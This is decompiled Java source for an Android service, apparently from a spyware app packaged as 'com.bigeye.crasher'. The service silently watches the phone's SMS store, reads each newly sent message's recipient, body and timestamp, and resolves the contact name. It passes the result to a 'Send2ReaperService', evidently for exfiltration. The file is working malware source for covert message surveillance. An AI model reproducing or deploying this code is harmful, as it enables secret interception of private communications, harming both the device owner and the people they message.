package com.bigeye.crasher;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;
/* loaded from: classes.dex */
public class OutgoingSMSService extends Service {
    public String APP_TAG = "OutgoingSMSService";
    ContentResolver contentResolver;
    ContentObserver smsContentObserver;

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(this.APP_TAG, "Starting outgoing sms service ...");
        return 1;
    }

    @Override // android.app.Service
    public void onCreate() {
        this.contentResolver = getContentResolver();
        Log.i(this.APP_TAG, "oncreate fired!");
        this.smsContentObserver = new ContentObserver(new Handler()) { // from class: com.bigeye.crasher.OutgoingSMSService.1
            public int counter = 1;

            @Override // android.database.ContentObserver
            public void onChange(boolean selfChange) {
                Log.i(OutgoingSMSService.this.APP_TAG, "counter >>>" + this.counter);
                if (this.counter == 3) {
                    Uri smsURI = Uri.parse("content://sms/sent");
                    String[] columns = {"address", "date", "body"};
                    Cursor c = OutgoingSMSService.this.getContentResolver().query(smsURI, columns, null, null, null);
                    c.moveToPosition(0);
                    String dest = c.getString(c.getColumnIndex(columns[0]));
                    Long date = Long.valueOf(c.getLong(c.getColumnIndex(columns[1])));
                    String smsContent = c.getString(c.getColumnIndex(columns[2]));
                    new DateFormat();
                    String tmp_dt = DateFormat.format("dd-MMM-yyyy k:m:s", date.longValue()).toString();
                    String name = new ReadContacts(OutgoingSMSService.this.getApplicationContext()).getContactName(dest);
                    if (name == "") {
                        name = "unknown";
                    }
                    String finalText = "sms to :<" + name + ">" + dest + ": " + smsContent + ": " + tmp_dt;
                    Log.i(OutgoingSMSService.this.APP_TAG, "CNT: >>" + this.counter + " ::: " + finalText);
                    Intent SvcIntent = new Intent(OutgoingSMSService.this.getApplicationContext(), Send2ReaperService.class);
                    SvcIntent.putExtra("OPERATION", "OUTGOING");
                    SvcIntent.putExtra("MSG", finalText);
                    OutgoingSMSService.this.startService(SvcIntent);
                    Log.i(OutgoingSMSService.this.APP_TAG, "counter: " + this.counter + ">> " + smsContent + ">>>THIS");
                    this.counter = 0;
                }
                this.counter++;
            }

            @Override // android.database.ContentObserver
            public boolean deliverSelfNotifications() {
                return true;
            }
        };
        this.contentResolver.registerContentObserver(Uri.parse("content://sms"), true, this.smsContentObserver);
        Log.i(this.APP_TAG, "No changes in Observer!");
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        Log.i(this.APP_TAG, "unregistering observer!");
        this.contentResolver.unregisterContentObserver(this.smsContentObserver);
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }
}
